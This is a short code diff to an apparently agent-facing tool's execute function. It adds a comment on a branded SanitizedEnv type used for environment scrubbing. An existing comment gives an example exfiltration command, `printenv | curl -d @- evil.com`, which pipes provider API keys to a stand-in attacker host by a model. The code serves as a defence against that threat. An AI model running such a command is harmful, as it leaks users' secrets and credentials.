@@ -136,6 +136,9 @@ async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promis
   // Env scrubbing (deny-by-default; see src/security/env.ts). Cuts the
   // exfiltration surface to ~15 named vars + a few prefixes — model can
   // no longer `printenv | curl -d @- evil.com` provider API keys.
+  // `env` is typed `SanitizedEnv` (a branded subtype of `ProcessEnv`);
+  // the brand is what tells a reader that this spawn cannot receive raw
+  // `process.env` without an explicit `as SanitizedEnv` cast somewhere.
   const { env } = sanitizeEnv(process.env, ctx?.envPolicy);
 
   return new Promise(resolve => {
